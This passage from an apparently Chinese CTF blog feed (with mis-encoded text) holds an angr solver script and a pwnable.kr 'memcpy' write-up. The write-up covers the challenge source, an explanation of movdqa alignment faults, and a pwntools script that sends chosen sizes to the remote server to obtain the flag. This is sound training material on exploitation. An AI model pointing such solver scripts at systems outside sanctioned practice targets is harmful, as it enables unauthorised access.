id="02-angr-condtion"><a href="#02-angr-condtion" class="headerlink" title="02_angr_condtion"></a>02_angr_condtion</h2><p>å‡ºäº†åœ¨idaä¸­ç›´æ¥å¯»æ‰¾å­—ç¬¦ä¸²åœ°å€ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰å‡½æ•°éå†æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¯»æ‰¾éœ€è¦çš„å­—ç¬¦ä¸²åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è‡ªå®šä¹‰å‡½æ•°å¯»æ‰¾å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    print(stdout_stdout)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br></pre></td></tr></table></figure><p>å®Œæ•´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;./02_angr_find_condition&#x27;</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init = project.factory.entry_state()</span><br><span class="line">    simgr = project.factory.simgr(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line">    print(is_success)</span><br><span class="line">    print(is_fail)</span><br><span class="line">    simgr.explore(find=is_success, avoid=is_fail)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution = simgr.found[<span class="number">0</span>]</span><br><span class="line">        flag = solution.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;not find&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()                              </span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211223412140.png" alt="è¾“å‡ºç»“æœ"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;ctf-angr&quot;&gt;&lt;a href=&quot;#ctf-angr&quot; class=&quot;headerlink&quot; title=&quot;ctf_angr&quot;&gt;&lt;/a&gt;ctf_angr&lt;/h2&gt;&lt;p&gt;ä¸€ä¸ªç”¨äºç»ƒä¹ angrçš„ctfé¢˜åº“ï¼Œä»å…¥é—¨åˆ°è¿›é˜¶ï¼ŒåŒæ—¶é…</summary>
      
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="angr" scheme="http://example.com/tags/angr/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr memcpy</title>
    <link href="http://example.com/2021/02/07/CTF/pwn/pwnable/pwnable.kr-memcpy/"/>
    <id>http://example.com/2021/02/07/CTF/pwn/pwnable/pwnable.kr-memcpy/</id>
    <published>2021-02-07T08:58:17.802Z</published>
    <updated>2021-02-12T12:41:26.357Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131853431.png">    </p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line"><span class="keyword">int</span> e;</span><br><span class="line"><span class="keyword">char</span>* src;</span><br><span class="line"><span class="keyword">char</span>* dest;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">// allocate memory</span></span><br><span class="line"><span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setup experiment parameters</span></span><br><span class="line"><span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;<span class="comment">// 2^13 = 8K</span></span><br><span class="line">low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sizes[i++] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// run experiment</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">size = sizes[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">slow_memcpy(dest, src, size);<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">fast_memcpy(dest, src, size);<span class="comment">// block-to-block memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿‡ç¨‹åˆ†æ"><a href="#è¿‡ç¨‹åˆ†æ" class="headerlink" title="è¿‡ç¨‹åˆ†æ"></a>è¿‡ç¨‹åˆ†æ</h3><ul><li>åœ¨ç”³è¯·çš„å†…å­˜å°äº64æ—¶ï¼Œé‡‡ç”¨çš„æ˜¯<code>slow_memcpy</code>é€ä¸ªå­—èŠ‚çš„å¤åˆ¶ï¼Œæ²¡æœ‰å…¶ä»–è¦æ±‚ï¼Œä½†æ˜¯é€Ÿåº¦è¾ƒæ…¢</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨å¤åˆ¶å†…å­˜å¤§äº64ä¸ªå­—èŠ‚æ—¶ï¼Œé‡‡ç”¨<code>fast_memcpy</code>ä¸­çš„æŒ‡ä»¤å¤åˆ¶ï¼Œå¤åˆ¶é€Ÿåº¦å¿«</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨ä½¿ç”¨æŒ‡ä»¤<code>nc pwnable.kr 9022</code>è¿æ¥ï¼Œéšä¾¿è¾“å…¥äº†ä¸€äº›å€¼è¿‡åå‘ç°æ°¸è¿œåœç•™åœ¨äº†ç¬¬å››æ¬¡æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœåœ¨æœ¬åœ°è¾“å…¥å´å¯ä»¥é€šè¿‡</p><ul><li><p><strong>movdqa</strong>æŒ‡ä»¤</p><p><code>movdqa</code>æŒ‡ä»¤çš„æ“ä½œæ•°éƒ½è¦æ±‚16å­—èŠ‚å¯¹é½ï¼Œåœ¨æœ¬åœ°å¯ä»¥æ­£å¸¸è¿è¡Œæ—¶å› ä¸ºmallocæœ¬èº«å°±æ˜¯8å­—èŠ‚å¯¹é½çš„ï¼ŒåŠ ä¸Š8ä¸ªå­—èŠ‚çš„chunkå¤´ï¼Œmallocè¿”å›çš„æŒ‡é’ˆå°±å·²ç»éµå¾ª16å­—èŠ‚å¯¹é½äº†ï¼Œæ‰€ä»¥éšä¾¿è¾“å…¥ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯åœ¨é¶æœºä¸Šå¯èƒ½æ˜¯å› ä¸ºUbuntuç‰ˆæœ¬çš„é—®é¢˜ï¼Œchunkåœ¨å†…å­˜ä¸­æ˜¯è¿ç»­çš„ï¼Œè€Œä¸éµå¾ªå†…å­˜å¯¹é½ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±è®¡ç®—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®—åœ¨èŒƒå›´ä¸­å¯è¾“å…¥çš„æ•°å­—é‚£äº›ç¬¦åˆè¦æ±‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i<span class="number">-3</span>].append(pow(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> range(pow(<span class="number">2</span>, i), pow(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size<span class="number">-8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i<span class="number">-3</span>].append(size)</span><br></pre></td></tr></table></figure></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9022</span>)</span><br><span class="line">chunk_size = [[], [], [], [], [], [], [], [], [], [], []]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i<span class="number">-3</span>].append(pow(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> range(pow(<span class="number">2</span>, i), pow(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size<span class="number">-8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i<span class="number">-3</span>].append(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    string = <span class="string">&#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;</span>.format(pow(<span class="number">2</span>,i), pow(<span class="number">2</span>,i+<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(string, str(chunk_size[i<span class="number">-3</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">log.success(sh.recv())</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212203957532.png"></p><ul><li><p>æ¥æ”¶</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212204107864.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131853431.png&quot;&gt;    &lt;/p&gt;
&lt;h3 id=&quot;æºç &quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr uaf</title>
    <link href="http://example.com/2021/02/05/CTF/pwn/pwnable/pwnable..kr-uaf/"/>
    <id>http://example.com/2021/02/05/CTF/pwn/pwnable/pwnable..kr-uaf/</id>
    <published>2021-02-05T15:33:16.078Z</published>
    <updated>2021-02-08T05:18:08.447Z</updated>
    
